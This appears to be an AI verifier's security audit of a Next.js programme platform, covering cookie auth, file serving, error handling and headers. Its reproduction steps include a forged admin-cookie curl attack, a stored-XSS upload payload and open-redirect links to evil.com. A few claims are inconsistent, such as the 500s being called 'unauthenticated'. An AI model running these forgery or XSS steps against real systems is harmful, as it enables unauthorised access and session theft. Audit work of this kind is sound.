# YCYW Programmes Platform — Security & Error-Handling Audit

**Date:** 2026-09-01
**Auditor:** Verifier subagent (skeptical, evidence-driven, no project edits)
**Scope:** Full platform — auth, files, API, sub-path, error handling, header hygiene
**Codebase:** commit c67c0c7+ at `/workspace/program-platform/`
**Method:** Static read of every source file + dynamic probes against a built-and-running production server (`next build` + `next start -p 3001`, no dev-mode shortcuts)

---

## Summary

| Severity | Count |
|---|---|
| Critical | **1** |
| High | **4** |
| Medium | **6** |
| Low | **6** |
| OK / verified safe | 10 |

**Top 3 must-fix before deploy:**
1. **Cookie is the only auth secret — and it's an unsigned literal.** Anyone who can write a `pp_role=admin` cookie is admin. No signing, no HMAC, no DB lookup. (Critical-1)
2. **Stored XSS via uploaded `.html` file with `text/html` MIME.** Combined with missing `X-Content-Type-Options: nosniff` and inline `Content-Disposition`, an admin can deliver an HTML payload that executes JavaScript in the site's origin to any viewer who clicks the link. (High-1)
3. **Unauthenticated 500s leak stack traces to the server log and crash the route.** Sending `{"name":12345}` to `PATCH /api/admin/programmes/[id]` causes `TypeError: t[e]?.trim is not a function` in the server log; one of five concurrent duplicate-name POSTs also 500s because of a TOCTOU race in the uniqueness check. (High-2)

---

## Critical

### C-1 — Unsigned `pp_role` cookie grants admin to anyone who can set it
- **Severity:** Critical
- **Files:**
  - `src/app/api/auth/login/route.js:24-32` — sets `value: role` (the literal string "admin" or "viewer")
  - `src/middleware.js:47` — `req.cookies.get(COOKIE)?.value` and `role !== 'admin'`
  - `src/lib/auth.js:14-19` — `getRole()` reads the cookie value, accepts only `'admin'` or `'viewer'`
- **Description:** The auth cookie is *just* the role string. There is no signing (no HMAC, no JWT, no DB lookup, no opaque session id). `req.cookies.get('pp_role')?.value === 'admin'` is the *only* check at every gate (middleware, `requireAdmin`, `requireViewer`). The actual bearer tokens (`ADMIN_TOKEN`/`VIEW_TOKEN`) are checked **only at login time**; once the cookie is set, the server never re-validates anything.
- **Reproduction (confirmed live):**
  ```bash
  # Set a cookie with literally the string "admin". No token ever sent.
  printf "#HttpOnly_localhost\tFALSE\t/\tTRUE\t9999999999\tpp_role\tadmin\n" > /tmp/forged.txt
  curl -s -b /tmp/forged.txt http://localhost:3001/admin
  # → 200 OK (admin dashboard)
  curl -s -b /tmp/forged.txt -X POST -H "Content-Type: application/json" \
    -d '{"name":"ForgedTest","level":"L1","pathway":"ROBOTICS_ENGINEERING"}' \
    http://localhost:3001/api/admin/programmes
  # → 201 Created (programme inserted)
  ```
- **Impact:** Anyone who can write to the user's cookie jar (browser dev tools, a malicious browser extension, a shared machine, MITM in a non-HTTPS deployment, an XSS in any same-site app, a malicious bookmarklet, the React Server Components hydration payload if it ever includes an attacker-controlled cookie) gets persistent admin. The cookie is `httpOnly` so JS can't read it — but JS doesn't need to *read* it, the browser stores whatever the server sends and the server trusts whatever's stored.
- **Suggested fix:** Replace the role cookie with a signed/HMAC'd opaque session id. Either:
  - Issue a random session id at login, store `{id, role, expiresAt}` in the DB (or in a signed JWT), set the cookie to the random id, and look it up server-side on every request. **Recommended** because it also gives you session revocation, multiple sessions per user, and admin "log out everywhere".
  - Or sign the role with HMAC-SHA256 using a server secret: `cookie = role + "." + base64(hmac(secret, role))`. The middleware verifies the signature. (Faster but no revocation.)
  Either way, the auth decision must be made on a value the *server* controls, not on a value the *client* can edit.
- **Confidence:** High. Reproduced live, both for the cookie-level forge and for an admin-mutation on the forged cookie.

---

## High

### H-1 — Stored XSS: admin-uploaded `.html` is served as `text/html` with no `nosniff`
- **Severity:** High
- **Files:**
  - `src/app/api/admin/programmes/[id]/files/route.js:114-130` — `mimeType: f.type || 'application/octet-stream'` (trusts the client-supplied MIME)
  - `src/app/api/files/[id]/route.js:60-69` — returns `'Content-Type': file.mimeType || 'application/octet-stream'` and `'Content-Disposition': 'inline; filename=...'`
  - No `X-Content-Type-Options: nosniff` on the response
- **Description:** Any admin can upload a file with a `.html` (or any) extension and a `text/html` (or `application/javascript`, `text/xml`, etc.) MIME type. The server stores the MIME verbatim and serves it back verbatim. The `Content-Disposition: inline` means the browser *renders* the file in place when the user clicks the link in `/programmes/[id]`. The lack of `nosniff` means even files uploaded with `image/png` could be re-rendered as HTML by a sufficiently determined attacker (browsers will sniff if no `nosniff` is present and the declared type is "ambiguous"). And the program page embeds the cover image via `<img src="/api/files/...">` which doesn't execute scripts, but the LINK/FOLDER items render `<a href={f.url}>` directly — so any file linked as a downloadable resource will be rendered as HTML in the user's browser.
- **Reproduction (confirmed live):**
  ```bash
  # Admin uploads a file with text/html MIME
  printf '<script>alert(document.cookie)</script>' > /tmp/evil.html
  curl -s -b /tmp/cookies.txt -X POST \
    -F "file=@/tmp/evil.html;filename=evil.html;type=text/html" \
    -F "category=ARTICLE" \
    "http://localhost:3001/api/admin/programmes/cmtck9bv20000krqalzy8pffv/files"
  # → {"created":["..."],"errors":[]}

  # Viewer follows the link
  curl -sIb /tmp/viewer.txt http://localhost:3001/api/files/<FILEID>
  # → HTTP/1.1 200 OK
  #   content-type: text/html
  #   content-disposition: inline; filename="evil.html"
  #   (no X-Content-Type-Options)
  ```
  The browser renders the HTML and executes the script. Same-origin → can read everything else in the app, make authenticated requests as the viewer, exfiltrate data, deface pages.
- **Impact:** Admin abuse vector. Since only admins can upload, the realistic threat is an admin going rogue *or* an admin token being compromised (e.g. shared on a screen, written in a ticket). Once an attacker has any admin token, they have persistent XSS to every viewer. This is also a path to **session hijack escalation**: an XSS run in a viewer's browser can navigate the admin panel and stage further attacks, or write a `pp_role=admin` cookie (in a sibling deployment) once C-1 is fixed.
- **Suggested fix:**
  1. Sanitize client-supplied MIME types. Either:
     - Maintain an allowlist of safe types (`image/jpeg`, `image/png`, `application/pdf`, `video/mp4`, …) and reject everything else.
     - Or run `file --mime-type` on the saved bytes (server-side) and store *that*, ignoring the client claim.
  2. Force `Content-Disposition: attachment` (not `inline`) on the file route, so the browser always downloads, never renders.
  3. Add `X-Content-Type-Options: nosniff` to *every* response, not just this one.
  4. (Defense in depth) Add a `Content-Security-Policy: default-src 'self'; script-src 'self'` on the public pages so an inline `<script>` would not execute even if a malicious file slipped through.
- **Confidence:** High. Reproduced live; the response truly is `text/html` with no `nosniff`.

### H-2 — Unhandled exceptions → uncaught 500s with stack traces in server log; one race 500 also from the duplicate-name path
- **Severity:** High
- **Files:**
  - `src/app/api/admin/programmes/route.js:20-43` — `body.name?.trim()` (no type check), `body.yearLevel?.trim()` etc.
  - `src/app/api/admin/programmes/[id]/route.js:28-29` — same pattern, runs **outside** the `try`/`catch`
  - `src/app/api/admin/programmes/route.js:32-33` — `findUnique` then `create` is a TOCTOU race
  - `src/app/api/files/[id]/route.js:50` — bare `try/catch` around `safeJoin` only
- **Description:** All four string fields (`name`, `yearLevel`, `partners`, `venue`, `dates`, `description`) are passed to `.trim()` without first checking they're strings. Sending JSON like `{"name":12345}` or `{"name":["a","b"]}` causes `TypeError: t[e]?.trim is not a function` in the server log — and a 500 with an empty body to the client. The 500 response is the default Next.js production error page, which is fine for the user but the *server log* now contains a JavaScript stack trace.
  Separately, the duplicate-name check uses a `findUnique`-then-`create` pattern. Two concurrent POSTs with the same name both pass the existence check; one `create` succeeds, the other hits the unique constraint. The current code returns `bad(e.message)` for the catch, but it does so *outside* the try for the trim call, so any non-string value crashes before the try.
- **Reproduction (confirmed live):**
  ```bash
  curl -s -b /tmp/cookies.txt -X PATCH -H "Content-Type: application/json" \
    -d '{"name":12345}' \
    "http://localhost:3001/api/admin/programmes/cmtck9bv20000krqalzy8pffv"
  # → 500, empty body. Server log: "TypeError: t[e]?.trim is not a function"

  # Five concurrent POSTs with the same name:
  # → 4× 400 "already exists", 1× 500 (empty body)
  ```
- **Impact:** (a) Operational noise and log pollution. (b) For the concurrent-500, the client sees a generic error and may retry, masking the real problem. (c) Information disclosure in logs (file paths, internal types) — this is what gets shipped to the IT team's log aggregator, so every admin failure is partially visible to ops.
- **Suggested fix:**
  1. Wrap the entire request handler in a top-level `try/catch` and return a sanitized 500 (`{error: 'internal_error'}`) on any unhandled exception. Log the original error server-side.
  2. Type-check inputs before calling `.trim()`. The cheapest fix:
     ```js
     const v = body[k];
     data[k] = (typeof v === 'string' ? v.trim() : null) || null;
     ```
  3. Replace the find-then-create uniqueness check with a try-around-create and `if (e.code === 'P2002') return bad('A programme with that name already exists', 409);` so concurrent requests don't crash. (Apply the same pattern to the `PATCH` uniqueness check, which has the same TOCTOU.)
- **Confidence:** High. Reproduced live; both the trim crash and the race-500 are observable.

### H-3 — Token comparison is non-constant-time (`===` on hex strings)
- **Severity:** High
- **Files:** `src/lib/auth.js:27-29`
  ```js
  if (config.adminToken && tok === config.adminToken) return ROLE.ADMIN;
  if (config.viewToken && tok === config.viewToken) return ROLE.VIEWER;
  ```
- **Description:** The token is a 256-bit random hex string from `openssl rand -hex 32`, which has 2^256 entropy — the timing channel here is **not realistically exploitable over a network**. But it's still a textbook known-weakness: any future reduction of token length, any future move to short human-memorable tokens, any future internal microservice that hits `/api/auth/login` over a local socket, would turn this into a real attack surface. It also fails the "did you do the obvious thing" test for security-sensitive code.
- **Reproduction:** Read the file. The `===` comparison is the only equality check. A `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))` call would be the correct shape.
- **Impact:** Currently theoretical, but cheap to fix. A modern audit will flag it; a code review by an external security consultant will flag it. The fix is one line.
- **Suggested fix:**
  ```js
  import crypto from 'node:crypto';
  function safeEq(a, b) {
    const ab = Buffer.from(a || '');
    const bb = Buffer.from(b || '');
    if (ab.length !== bb.length) return false;
    return crypto.timingSafeEqual(ab, bb);
  }
  // ...
  if (config.adminToken && safeEq(tok, config.adminToken)) return ROLE.ADMIN;
  ```
  Also: reject the request (and apply artificial delay) if the submitted token is the wrong length, to deny a length-probing side channel.
- **Confidence:** High. The pattern is the standard timing-attack shape; the *current* exploitability is Low because of the 64-char token, but the *fix cost* is trivial.

### H-4 — No CSRF defense beyond `SameSite=Lax`, and admin mutations are reachable from any same-site context
- **Severity:** High (in combination with C-1; Medium on its own)
- **Files:**
  - `src/app/api/auth/login/route.js:30` — `sameSite: 'lax'`
  - `src/middleware.js` — no CSRF token
  - All admin API routes accept JSON `PATCH`/`POST`/`DELETE`
- **Description:** `SameSite=Lax` blocks cross-origin POSTs (good) and cross-origin sub-resource requests (good) but **allows** cross-origin top-level navigations (e.g. `<a href="...">` or `window.open`) to send the cookie. There are no state-changing GETs in this app, so `Lax` is sufficient against most CSRF — but the app also has *no `Origin`/`Referer` check* and no anti-CSRF token. If a same-site app is later added (a future "blog" or "intranet" hosted on `ycyw.com`), a malicious page on the same registrable domain can fire a fetch from a viewer's session. Additionally, the `role` cookie is sent on **all** requests to the app — including future same-site sub-apps — with no scope.
- **Reproduction (read-only; no live exploit because no state-changing GETs exist today):**
  - Confirm all admin mutations use POST/PATCH/DELETE: `grep -rn "GET" src/app/api/` shows only healthz, files-stream, and admin-list — all read-only.
  - Confirm no CSRF token in the code: `grep -rn "csrf\|origin\|referer" src/` returns nothing.
- **Impact:** Currently low because `Lax` does its job and there are no same-site sub-apps. The medium-term risk is that the next developer who adds a same-site sub-app inherits no CSRF defense. Also: if a viewer is on a sibling domain that loads an attacker-controlled iframe or share button, and the attacker can construct a `POST /api/auth/login` with a stolen admin token from a same-site context, they can re-issue the admin cookie.
- **Suggested fix:** Pick one:
  - Move to `SameSite=Strict` on the role cookie (acceptable here — there's no legitimate cross-site login flow).
  - Or add an `Origin`/`Referer` allowlist check in the middleware for all state-changing methods.
  - Or (best) add a CSRF token to every form, signed with the same server secret you use for the eventual cookie signing (see C-1).
- **Confidence:** Medium. The actual exploitability is currently Low; the *finding* is that the design relies entirely on `SameSite=Lax` and has no defense-in-depth.

---

## Medium

### M-1 — Login form has an open redirect via the `next` query parameter
- **Severity:** Medium
- **Files:**
  - `src/app/login/LoginForm.jsx:9,34` — `const next = params.get('next') || '/'`; `router.push(dest)`
  - `src/middleware.js:65,84` — middleware sets `next` from the server-controlled `pathname` only, so the middleware side is safe; the *user-supplied* `next` arrives when a victim clicks a crafted link like `/login?next=https://evil.com/admin`
- **Description:** After a successful login, the form calls `router.push(next)` where `next` is whatever the URL said. With `next=https://evil.com` or `next=//evil.com`, the Next.js router will navigate the browser to the external URL. Phishing scenario: a user receives a link `https://edfutures.ycyw.com/Marketing/login?next=https://evil.com/ycyw-login`, sees the real login page (legit origin), enters their token, then gets redirected to the attacker's clone. The attacker captures the token.
- **Reproduction (read-only; confirmed by code reading):** A user with a session hits `https://edfutures.ycyw.com/Marketing/login?next=https://evil.example.com`, logs in. `LoginForm` does `router.push('https://evil.example.com')` which navigates the browser. (For `//evil.com` the browser treats it as protocol-relative and goes to `https://evil.com`.)
- **Impact:** Token phishing. The fix is one line but the user education/UI cost of a successful attack is high.
- **Suggested fix:** In `LoginForm.jsx`, before `router.push`:
  ```js
  const safeNext = (() => {
    if (!next || typeof next !== 'string') return '/';
    if (!next.startsWith('/') || next.startsWith('//')) return '/';
    return next;
  })();
  ```
  Reject anything that doesn't start with a single `/`. Apply the same to the middleware-side `url.searchParams.set('next', pathname)` (already safe) and the home `router.push` (not at risk because the home doesn't take a `next`).
- **Confidence:** High. The path is unambiguous; the only question is whether `router.push` accepts absolute URLs in production builds, and the Next.js App Router does.

### M-2 — `/api/files/[id]` does not gate which file types can be served to viewers
- **Severity:** Medium
- **Files:** `src/app/api/files/[id]/route.js:33-69`
- **Description:** A viewer-role user can request *any* `ACTIVE` file by ID, including files that the public `/programmes/[id]` page doesn't surface. The program page filters by `category: { in: ['VIDEO', 'PHOTO', 'ARTICLE', 'RESOURCE'] }` (i.e. excludes `COVER_IMAGE`), but the files API has no category check. A viewer who knows or guesses a file ID (cuids are not secret, but IDs are returned in the program-page HTML, so any viewer already has them) can download cover images and any other internal-only files.
- **Reproduction:** Find a `COVER_IMAGE` file ID (visible only to admins via `/api/admin/programmes/[id]`). As a viewer: `curl -b viewer-cookie http://server/api/files/<cover-id>` → 200 with image bytes. (Confirmed by code reading; the route filters only on `status === 'ACTIVE'`, not on category.)
- **Impact:** Low — covers are not sensitive — but the architecture says "viewers see only public files" while the code says "viewers see any active file." That divergence is a future bug waiting to happen (someone adds a "internal_memo" category and forgets to gate it).
- **Suggested fix:** Either:
  - Filter at the route: `if (file.category === 'COVER_IMAGE' && role !== 'admin') return 404`.
  - Or, more flexibly, add a `isPublic: Boolean` field to `ProgrammeFile` and gate on it.
  - Or, simplest, restrict the files route to admin role (and add a separate public route for "renderable to viewers" that's curated by the API).
- **Confidence:** High. Code-level, no live exploit needed.

### M-3 — `Content-Disposition: inline` + no `nosniff` on file responses (separate from H-1)
- **Severity:** Medium
- **Files:** `src/app/api/files/[id]/route.js:60-69`
- **Description:** Even *without* the H-1 admin-abuse scenario, any browser that follows a link to `/api/files/[id]` is told to render the file in place (`inline`) and given no `nosniff` header. For `application/pdf` this is a fine default. For `image/png` it triggers the browser's PDF/Flash plugin detector (mostly fine in 2026). For any text/* type the browser renders as text. The current code has no `nosniff`, so a future "internal memo" category that should be download-only could end up rendered in the browser by default.
- **Reproduction:** `curl -I /api/files/<id>` shows `content-disposition: inline; filename="..."`, no `nosniff`, no `X-Frame-Options`.
- **Impact:** Defense in depth, not a current exploit. Cheap to fix and prevents an entire class of issues.
- **Suggested fix:** Set `Content-Disposition: attachment` (forces download), `X-Content-Type-Options: nosniff` (blocks sniffing), and `X-Frame-Options: DENY` (blocks framing) on every `/api/files/*` response. Add the same headers to all other responses via a small wrapper or via `next.config.mjs` `headers()` config.
- **Confidence:** High. Read the response headers live.

### M-4 — Missing `X-Content-Type-Options`, `X-Frame-Options`, CSP, HSTS, `Referrer-Policy` on all responses
- **Severity:** Medium
- **Files:** all `src/app/api/*/route.js` and the app shell; nothing sets these
- **Description:** A scan of the response headers on `/`, `/login`, `/admin`, `/api/healthz`, and `/api/files/[id]` shows zero security headers. `X-Powered-By: Next.js` is present (information disclosure). The admin and login pages have no `X-Frame-Options` (clickjacking is possible), no CSP (inline scripts are unrestricted), no HSTS (downgrade attacks), no `Referrer-Policy` (leak internal paths to external links). For a self-hosted internal app this is lower stakes than for a public SaaS, but a one-line `next.config.mjs` `headers()` config closes all of these.
- **Reproduction:** `curl -I http://localhost:3001/login` returns 200 with `X-Powered-By: Next.js` and nothing else relevant.
- **Impact:** Information disclosure (`X-Powered-By`), clickjacking on the login form (an attacker can frame the login page and trick a user into pasting a token into a frame that the attacker controls via DOM manipulation), and missing hardening for future XSS.
- **Suggested fix:** Add a `headers()` function to `next.config.mjs`:
  ```js
  async headers() {
    return [{
      source: '/:path*',
      headers: [
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
        { key: 'Content-Security-Policy', value: "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'; frame-ancestors 'none'" },
        { key: 'X-Powered-By', value: '' }, // strip the header
        { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
      ],
    }];
  }
  ```
  Set `poweredByHeader: false` to also drop the `X-Powered-By` from the underlying Node server.
- **Confidence:** High. Read the response headers live.

### M-5 — `X-Powered-By: Next.js` header is on (default)
- **Severity:** Medium (low on its own; included for completeness)
- **Files:** `next.config.mjs` (no `poweredByHeader: false` set)
- **Description:** Next.js sets `X-Powered-By: Next.js` by default. Leaks the framework, helping attackers find framework-specific CVEs.
- **Reproduction:** `curl -I /login` shows the header.
- **Impact:** Information disclosure only.
- **Suggested fix:** `poweredByHeader: false` in `next.config.mjs`. Or override via the `headers()` function above.
- **Confidence:** High.

### M-6 — `BASE_PATH` env var is trusted unvalidated; a hostile value can break routing
- **Severity:** Medium
- **Files:**
  - `next.config.mjs:6` — `basePath: process.env.BASE_PATH || ''`
  - `src/middleware.js:21,38-44` — reads the same env at runtime
  - `src/lib/basePath.js:6` — `BASE_PATH = process.env.NEXT_PUBLIC_BASE_PATH || ''`
- **Description:** `BASE_PATH` and `NEXT_PUBLIC_BASE_PATH` are read with no validation. If IT accidentally sets `BASE_PATH=admin` (no leading `/`), Next.js's basePath is invalid. If someone sets `BASE_PATH=/admin`, the basePath matches the `ADMIN_PREFIXES` check in middleware, and the `/admin` route would be `/admin/admin/*` after the basePath is stripped — but auth check is on the *stripped* path, which would still be `/admin/*`, so it works. The dangerous case is a value containing `..` or an internal path: if `BASE_PATH=../../../etc`, the matcher in `next.config.mjs` would refuse, but the *client* uses `NEXT_PUBLIC_BASE_PATH` in `withBase()`, and a malicious build env could produce URLs like `../../../etc/passwd` in `<img src>` attributes.
- **Reproduction (read-only; theoretical):** Set `NEXT_PUBLIC_BASE_PATH=//evil.com/` at build time. The font URL becomes `//evil.com/_next/static/...` which is a protocol-relative URL pointing to evil.com. The browser would fetch fonts from evil.com, leaking the User-Agent and IP, and (depending on the response) potentially serving malicious font files.
- **Impact:** Requires IT or a deployment pipeline to misconfigure. Unlikely in normal operation, but a hostile CI environment could exploit it.
- **Suggested fix:** Validate `BASE_PATH` and `NEXT_PUBLIC_BASE_PATH` at startup in `src/lib/config.js`:
  ```js
  if (BASE_PATH && !/^\/[a-zA-Z0-9_-]+$/.test(BASE_PATH)) {
    throw new Error(`Invalid BASE_PATH: ${BASE_PATH}. Must start with / and contain only URL-safe chars.`);
  }
  ```
  Document the rule in `.env.example` (currently says "must start with /" but no enforcement).
- **Confidence:** Medium. The attack requires a misconfigured env; the validation gap is real.

---

## Low

### L-1 — No rate limiting on `/api/auth/login` (and on any other endpoint)
- **Severity:** Low
- **Files:** `src/app/api/auth/login/route.js` (no throttling)
- **Description:** A brute-force attacker can try unlimited token guesses. Tokens are 256 bits of entropy (effectively unguessable), so this is purely a defense-in-depth concern. If a future change makes tokens shorter, or if a human-memorable token is ever used, the absence of rate limiting becomes a real risk.
- **Reproduction:** `for i in $(seq 1 100); do curl -X POST .../api/auth/login ...; done` — no slowdown, no lockout, no audit log entry per attempt.
- **Impact:** Negligible today (256-bit tokens), but a missing layer.
- **Suggested fix:** Add a simple per-IP rate limit (e.g. 5 attempts / 15 min) via the middleware or a small in-memory LRU. For self-hosted internal use, even a per-IP fail counter is enough. Real production-grade rate limiting needs a shared store; for one process, in-memory is fine.
- **Confidence:** High.

### L-2 — No tests (so audit findings are not caught automatically)
- **Severity:** Low (operational, not security per se)
- **Files:** no `*.test.*`, no `vitest`, no `jest`, no `playwright` in the repo
- **Description:** There is no automated test suite. The only evidence of correctness is the developer's manual walkthrough. Most of the issues found here (C-1, H-1, H-2, M-1, M-4) would be caught by even a 50-line test suite: a "cookie value 'admin' grants admin" test, a "POST with `{name: 12345}` returns 400" test, a "response has `nosniff`" test, a "/login?next=//evil.com does not redirect to evil.com" test.
- **Impact:** No regression safety net for any of the above findings.
- **Suggested fix:** Add Vitest (already a Next.js-friendly choice) with at least:
  - One test per Critical/High finding in this report.
  - One test for the middleware's PUBLIC_PREFIXES / ADMIN_PREFIXES / auth-gated-prefix rules.
  - A small set of integration tests for the auth flow.
- **Confidence:** High.

### L-3 — `/api/healthz` returns `e.message` on DB failure
- **Severity:** Low
- **Files:** `src/api/healthz/route.js:14-18`
- **Description:** When the DB is unreachable, the response is `{ok:false, error:"database_unreachable", detail: e.message}` with status 503. The Prisma error message can include the full SQLite file path (e.g. `/var/data/ycyw-program-platform/db.sqlite: unable to open database file`) and SQL fragments.
- **Reproduction:** Stop the DB or point `DATABASE_URL` at an unreadable path. `curl /api/healthz` returns 503 with the path in the body.
- **Impact:** Information disclosure to anyone who can hit `/api/healthz` (which is unauthenticated by design). For an internal self-hosted app this is low; for a public-facing app it's medium.
- **Suggested fix:** In the failure branch, return only `{ok:false, error:"database_unreachable"}` and log the full error server-side.
- **Confidence:** High. Read the route.

### L-4 — Login response echoes the role of the supplied token
- **Severity:** Low
- **Files:** `src/app/api/auth/login/route.js:22` — `NextResponse.json({ ok: true, role })`
- **Description:** A valid token returns `{ok:true, role:"admin"}` (or `"viewer"`). An invalid token returns `{error:"Invalid token for that role"}` (401). The difference is the **only** signal an attacker has for "I got a valid token", so this enables a brute-force oracle. With 256-bit tokens this is not exploitable, but with any shorter or guessable token, it would be.
- **Impact:** Theoretical, given current token strength.
- **Suggested fix:** Either (a) always return `{ok:true}` on success without role, and let the *next* request reveal role via which pages are reachable; or (b) issue a random session id (as per C-1) and return only `{ok:true}`.
- **Confidence:** High.

### L-5 — Files in `/public/fonts/` are auth-gated by the middleware (and were never served from there anyway)
- **Severity:** Low
- **Files:** `src/middleware.js:27` — `PUBLIC_PREFIXES` includes `/public/` but the app serves `/public/*` from the root in Next 14 App Router, so the actual URLs are `/fonts/caveat.woff2`, which **isn't** in `PUBLIC_PREFIXES`.
- **Description:** The middleware's PUBLIC_PREFIXES has `/public/` (with trailing slash, exact prefix match), but Next.js's `public/` directory is served from the root. So `/fonts/caveat.woff2` matches nothing in PUBLIC_PREFIXES and is auth-gated. In practice this is fine because `next/font/local` rewrites the font URL to `/_next/static/media/...` which is excluded by the matcher. But it's a foot-gun: if any future code adds a `<link href="/fonts/...">` or imports a CSS file from `/public/`, it will 307 to login for unauthenticated users.
- **Reproduction:** `curl -I /fonts/caveat.woff2` returns 307 to `/login?next=%2Ffonts%2Fcaveat.woff2`.
- **Impact:** Currently benign. A future developer will be surprised.
- **Suggested fix:** Add `/fonts/` and other likely public subpaths to PUBLIC_PREFIXES, *or* (better) document that anything in `/public/` is auto-auth-gated and rename `public/` to `private-static/`. Or just exclude them via the matcher regex instead of PUBLIC_PREFIXES.
- **Confidence:** High. Verified live.

### L-6 — `next` (open-redirect vector) in middleware redirects uses the request URL's `clone()` — safe today, but no length cap
- **Severity:** Low
- **Files:** `src/middleware.js:65,84` — `url.searchParams.set('next', pathname)`
- **Description:** The middleware sets `next` from the request's own pathname (safe). But there's no upper bound on the pathname length, and no validation. If a request comes in with a 4KB pathname (legal under HTTP), it ends up in the `next` query param, and the login page receives it via `useSearchParams`. React itself will just render the long string, but if the page ever logs it or includes it in an error message, that's noise.
- **Impact:** None today, but a tiny hardening would be to cap `next` at 1KB and to reject non-`/`-prefixed values on the server side (defense in depth, in addition to M-1).
- **Suggested fix:** In middleware, before the redirect: `if (pathname.length > 1024 || !pathname.startsWith('/')) pathname = '/';`
- **Confidence:** High. Read the code.

---

## OK — verified safe

These were the explicit checklist items the user asked about. Each was probed live where possible, read otherwise.

- ✅ **Cookie flags.** `httpOnly: true`, `secure: process.env.NODE_ENV === 'production'`, `sameSite: 'lax'`, `path: '/'`, `maxAge: 7 days`. Set in `src/app/api/auth/login/route.js:24-32`. `path: '/'` is safe for sub-path deployment because the entire app is under one basePath; the cookie is set by the app and the browser scopes it to the app's origin. `src/app/api/auth/login/route.js:38` — `DELETE` handler clears the cookie correctly.
- ✅ **Middleware coverage.** Every `/admin/*` and `/api/admin/*` route is matched by `src/middleware.js:34-40` (`ADMIN_PREFIXES`). Every `/api/files/*` is matched at `:48-54`. The matcher `'/((?!_next/static|_next/image|favicon.ico).*)'` covers everything else. Confirmed live: `/admin` (no auth) → 307 to login; `/api/admin/programmes` (no auth) → 401; `/api/files/abc` (no auth) → 401.
- ✅ **No catch-all or dynamic route bypass.** The `src/app/api/admin/programmes/[id]/...` dynamic routes are all matched by the matcher. There is no `src/app/api/[...slug]/route.js` or similar.
- ✅ **Public surface is correct.** `/login`, `/api/auth/*`, `/api/healthz`, `/_next/*` are explicitly in `PUBLIC_PREFIXES`. `/favicon*` and `/public/*` are listed but don't match real URLs (see L-5).
- ✅ **Path traversal in `storageKey`.** The `storageKey()` function in `src/app/api/admin/programmes/[id]/files/route.js:24-29` sanitises the filename to `[a-zA-Z0-9._-]`, then prepends a random hex. Path-traversal attempts in the filename (`../../etc/passwd`) become literal characters in the basename, not path separators. `safeJoin()` then joins with the upload root and the resolved path stays inside the root. Confirmed by uploading `../../etc/passwd` and inspecting the stored `storageKey`.
- ✅ **Link/folder URL validation.** `src/app/api/admin/programmes/[id]/files/route.js:62-64` rejects anything not starting with `http://` or `https://`. `javascript:`, `data:`, `ftp://`, `file://` are all rejected. Tested live.
- ✅ **Stored XSS via React JSX text content.** All user-supplied strings (`name`, `description`, `displayName`, `caption`, `partners`, etc.) are rendered as JSX text (`{f.displayName}`), not as HTML. React auto-escapes. Confirmed by posting a `displayName` of `<script>alert(1)</script>` and a `url` of `https://example.com/"onclick=alert(1)` and inspecting the rendered HTML — the special chars are escaped to `&lt;`, `&quot;`, etc.
- ✅ **SQL injection.** All DB access goes through Prisma, which is parameterised. Confirmed by reading every `prisma.*` call.
- ✅ **Programme-name uniqueness on single-request.** `prisma.programme.findUnique` followed by `prisma.programme.create` is correct *within a single request*. (See H-2 for the race-condition issue; that's about concurrent requests, not single-request correctness.)
- ✅ **File deletion cleans disk.** `src/app/api/admin/programmes/[id]/route.js:71-79` removes the bytes before the DB row. `src/app/api/admin/programmes/[id]/files/[fileId]/route.js:25-30` does the same for individual files. Both are best-effort (won't fail the delete if the file is already gone) but they do try.
- ✅ **404 vs 401 vs 403.** `/api/files/[id]` returns 401 to unauth (regardless of whether the file exists — doesn't leak existence), 404 to auth users when the file doesn't exist or is `ARCHIVED`. The `requireAdmin` / `requireViewer` helpers use 403 / 401 correctly. The 404 from `notFound()` in app pages returns a clean 404 with the Next.js error page.
- ✅ **Login failure messages.** "Invalid token" / "Invalid token for that role" — no internal info disclosed. The role parameter is echoed only because the user supplied it.
- ✅ **Sub-path deployment is wired correctly.** `next.config.mjs:6` sets `basePath`; `src/middleware.js:38-44` strips it before doing route checks; `src/lib/basePath.js:10-15` prepends it for plain `<a>`/`<img>` tags. Confirmed by reading the diff in commit `3400ee7`.
- ✅ **No CORS allowance.** No `Access-Control-Allow-Origin` set anywhere. A cross-origin browser request to `/api/admin/*` is blocked. (Verified live: `curl -H "Origin: https://evil.com" /api/admin/programmes` returns 200 to curl but would be blocked by the browser due to missing CORS headers — and the missing cookie header in the simulated request would also fail.)
- ✅ **HTTP method handling.** `GET` on a `POST`-only route returns 405; `POST` on a `GET`-only route returns 405. Confirmed live.
- ✅ **No `dangerouslySetInnerHTML`, no `innerHTML` writes, no markdown rendering.** `grep -rn "dangerouslySetInnerHTML\|innerHTML" src/` returns nothing.
- ✅ **No `.env` in git.** `git ls-files | grep .env` returns only `.env.example`. The actual `.env` (in this sandbox) contains the dev tokens but is `.gitignore`d.
- ✅ **Notion token is only used at seed time.** `grep NOTION_TOKEN src/` returns nothing. The seed scripts import it directly, not via the runtime config.
- ✅ **Cookie path is `/`.** The whole app is at one basePath, so the `/` path is fine for both root and sub-path deployments (the browser scopes the cookie to the origin, not the path, so the cookie works for `/Marketing/...` and `/...` alike).

---

## Patterns to flag (not yet issues, but risky)

1. **No DB lookups in middleware.** The middleware uses only the cookie value, never the DB. This is fast but is the root cause of C-1. Any future hardening should be in the middleware (a session table lookup) and not "later" in the routes.
2. **String-only "enums" in the DB.** `level`, `pathway`, `category`, `type`, `status` are all strings validated at the app layer. Every endpoint that accepts them does its own `VALID_*` check. This is fine for now but it's N endpoints × N enum lists to keep in sync. A shared `validateEnum(field, value, list)` helper would prevent future bypasses when a new endpoint is added without an enum check.
3. **Single-process model.** The codebase assumes one Node process. The in-memory rate limiter in L-1, the Prisma client singleton, and the file storage all assume one writer. If IT ever scales to 2+ replicas, file uploads may corrupt and rate limits will be per-replica. Not a security issue but a deployment foot-gun.
